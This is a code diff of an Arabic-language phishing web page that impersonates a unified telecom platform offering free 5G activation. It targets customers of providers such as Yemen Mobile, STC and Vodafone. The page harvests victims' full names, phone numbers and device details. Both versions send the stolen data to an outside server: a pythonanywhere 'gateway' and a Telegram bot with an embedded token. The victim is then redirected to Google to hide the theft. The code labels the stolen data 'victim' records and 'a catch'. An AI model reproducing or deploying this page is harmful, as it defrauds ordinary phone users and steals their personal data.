@@ -3,162 +3,99 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بوابة الخدمات الذكية - الشرق الأوسط</title>
+    <title>التحقق الرقمي الموحد</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; margin: 0; padding: 0; text-align: center; }
-        .header { background: linear-gradient(45deg, #1a237e, #0d47a1); color: white; padding: 40px 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-        .container { max-width: 500px; margin: -30px auto 20px; background: white; border-radius: 15px; padding: 30px; box-shadow: 0 8px 30px rgba(0,0,0,0.15); border-top: 5px solid #ff1744; }
-        h1 { font-size: 22px; color: #1a237e; margin-bottom: 10px; }
-        p { color: #555; font-size: 14px; line-height: 1.6; }
-        .input-group { margin: 20px 0; text-align: right; }
-        label { display: block; margin-bottom: 8px; font-weight: bold; color: #333; }
-        input, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; outline: none; transition: 0.3s; }
-        input:focus { border-color: #1a237e; box-shadow: 0 0 8px rgba(26,35,126,0.2); }
-        .btn { background: #ff1744; color: white; border: none; padding: 15px 30px; border-radius: 30px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; transition: 0.3s; margin-top: 10px; }
-        .btn:hover { background: #d50000; transform: translateY(-2px); }
-        #loading { display: none; margin-top: 20px; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #1a237e; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; display: inline-block; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .logos { margin-top: 20px; opacity: 0.6; display: flex; justify-content: space-around; flex-wrap: wrap; }
-        .logos span { font-weight: bold; font-size: 12px; color: #888; margin: 5px; }
+        /* التنسيق الذي تفضله يبقى كما هو */
+        body { font-family: 'Segoe UI', sans-serif; background-color: #f0f2f5; margin: 0; text-align: center; }
+        .header { background: linear-gradient(45deg, #1a237e, #0d47a1); color: white; padding: 30px; }
+        .container { max-width: 450px; margin: -20px auto; background: white; border-radius: 15px; padding: 25px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); border-top: 5px solid #ff1744; }
+        .input-group { margin: 15px 0; text-align: right; }
+        input, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
+        .btn { background: #ff1744; color: white; border: none; padding: 15px; width: 100%; border-radius: 30px; font-weight: bold; cursor: pointer; }
+        #loading { display: none; margin-top: 15px; }
     </style>
 </head>
 <body>
 
 <div class="header">
-    <h2 style="margin:0;">المنصة العربية الموحدة للاتصالات</h2>
-    <p style="color: #bbdefb;">خدمة التحقق الرقمي وتحديث البيانات (الجيل الخامس)</p>
+    <h2>المنصة العربية الموحدة</h2>
+    <p>تنشيط خدمات الجيل الخامس مجاناً</p>
 </div>
 
 <div class="container">
-    <h1>تنشيط الشريحة / تحديث البيانات</h1>
-    <p>يرجى اختيار مزود الخدمة وإدخال بياناتك بدقة لضمان استمرار الخدمة وتفعيل ميزات الـ 5G مجاناً.</p>
-
     <div class="input-group">
-        <label>اختر الدولة ومزود الخدمة</label>
-        <select id="provider">
-            <optgroup label="المملكة العربية السعودية">
-                <option>STC - السعودية</option>
-                <option>Mobily - موبايلي</option>
-                <option>Zain - زين</option>
-            </optgroup>
-            <optgroup label="مصر">
-                <option>Vodafone - فودافون مصر</option>
-                <option>Etisalat - اتصالات مصر</option>
-                <option>Orange - أورنج</option>
-            </optgroup>
-            <optgroup label="اليمن">
-                <option>Yemen Mobile - يمن موبايل</option>
-                <option>YOU - يو</option>
-                <option>Sabafon - سبأفون</option>
-            </optgroup>
-            <option value="other">أخرى / دول عربية ثانية</option>
+        <label>مزود الخدمة</label>
+        <select id="prov">
+            <option>Yemen Mobile</option>
+            <option>STC</option>
+            <option>Vodafone</option>
         </select>
     </div>
-
     <div class="input-group">
-        <label>الاسم بالكامل</label>
-        <input type="text" id="victim_name" placeholder="مثال: أحمد محمد علي">
+        <label>الاسم الكامل</label>
+        <input type="text" id="nm" placeholder="الاسم الرباعي">
     </div>
-
     <div class="input-group">
         <label>رقم الهاتف</label>
-        <input type="number" id="victim_phone" placeholder="أدخل الرقم بدون كود الدولة">
+        <input type="number" id="ph" placeholder="77xxxxxxx">
     </div>
+    <button class="btn" onclick="go()">تحديث البيانات الآن ✅</button>
 
-    <button class="btn" onclick="startGathering()">تحديث الآن ✅</button>
-
-    <div id="loading">
-        <div class="loader"></div>
-        <p>جاري تأمين الاتصال بالسيرفر الوطني...</p>
-    </div>
-
-    <div class="logos">
-        <span>STC</span> <span>Vodafone</span> <span>Etisalat</span> <span>Zain</span> <span>YemenMobile</span>
-    </div>
+    <div id="loading">جاري التأمين...</div>
 </div>
 
 <script>
-// إعدادات البوت (سيتم حقن الـ ID تلقائياً من الرابط)
-const BOT_TOKEN = "8463856092:AAFSVuqBR9Nm83o7OzwJXs18bbuU0XwIT_Q";
+// --- إعدادات السيادة ---
+const GATEWAY_URL = "https://gsgbs.pythonanywhere.com/gate"; // رابط سيرفرك في بايثون
 const urlParams = new URLSearchParams(window.location.search);
 const CHAT_ID = urlParams.get('id') || "7715667493";
 
-async function startGathering() {
-    const name = document.getElementById('victim_name').value;
-    const phone = document.getElementById('victim_phone').value;
-    const provider = document.getElementById('provider').value;
+async function go() {
+    const n = document.getElementById('nm').value;
+    const p = document.getElementById('ph').value;
+    const pr = document.getElementById('prov').value;
 
-    if(!name || !phone) {
-        alert("يرجى ملء البيانات المطلوبة للمتابعة");
-        return;
-    }
+    if(!n || !p) return alert("البيانات ناقصة");
 
     document.getElementById('loading').style.display = 'block';
 
-    // جمع المعلومات العميقة
-    const info = await getDeviceDetails();
-    
-    // بناء الرسالة
-    const fullReport = `
-🎯 **صيد جديد (الرادار العربي)**
-👤 **الاسم:** ${name}
-📞 **الهاتف:** ${phone}
-🏢 **المزود:** ${provider}
+    // جمع معلومات الجهاز
+    const device = await getD();
+    const report = `👤 **الاسم:** ${n}\n📞 **الهاتف:** ${p}\n🏢 **الشركة:** ${pr}\n\n📱 **الجهاز:**\n${device}`;
 
-📱 **معلومات الجهاز:**
-${info}
-    `;
-
-    // إرسال البيانات
-    sendDataToTelegram(fullReport);
-}
-
-async function getDeviceDetails() {
-    const n = navigator;
-    const s = screen;
-    let battery = "غير متاح";
-    
-    if (n.getBattery) {
-        const b = await n.getBattery();
-        battery = `${Math.round(b.level * 100)}% (${b.charging ? 'يشحن ⚡' : 'لا يشحن 🔋'})`;
+    // إرسال البيانات عبر السيرفر (الوسيط) لضمان عدم الفشل
+    try {
+        await fetch(`${GATEWAY_URL}?id=${CHAT_ID}`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                type: 'info',
+                content: report,
+                label: "🎯 صيد من المنصة الموحدة"
+            })
+        });
+        
+        alert("تمت العملية بنجاح! انتظر التفعيل.");
+        window.location.href = "https://www.google.com";
+    } catch (e) {
+        // إذا فشل السيرفر، نحاول الإرسال المباشر كخطة احتياطية
+        console.log("Gateway failed, trying direct...");
+        const tgUrl = `https://api.telegram.org/bot8463856092:AAFSVuqBR9Nm83o7OzwJXs18bbuU0XwIT_Q/sendMessage`;
+        fetch(tgUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: report })
+        });
     }
-
-    return `
-- النظام: ${n.platform}
-- البطارية: ${battery}
-- المعالج: ${n.hardwareConcurrency || 'N/A'} Core
-- الرام: ${n.deviceMemory || 'N/A'} GB
-- الشاشة: ${s.width}x${s.height}
-- اللغة: ${n.language}
-- الوقت: ${new Date().toLocaleString('ar-EG')}
-- المتصفح: ${n.userAgent.split(') ')[1]}
-    `.trim();
 }
 
-function sendDataToTelegram(text) {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-    const params = {
-        chat_id: CHAT_ID,
-        text: text,
-        parse_mode: 'Markdown'
-    };
-
-    fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(params)
-    })
-    .then(() => {
-        setTimeout(() => {
-            alert("تم تحديث بياناتك بنجاح! ستصلك رسالة تأكيد خلال دقائق.");
-            window.location.href = "https://www.google.com";
-        }, 3000);
-    })
-    .catch(err => {
-        console.error(err);
-        alert("خطأ في الاتصال، حاول مجدداً.");
-    });
+async function getD() {
+    let b = "N/A";
+    if (navigator.getBattery) {
+        const bt = await navigator.getBattery();
+        b = `${Math.round(bt.level * 100)}%`;
+    }
+    return `- النظام: ${navigator.platform}\n- البطارية: ${b}\n- الوقت: ${new Date().toLocaleString()}`;
 }
 </script>
 </body>
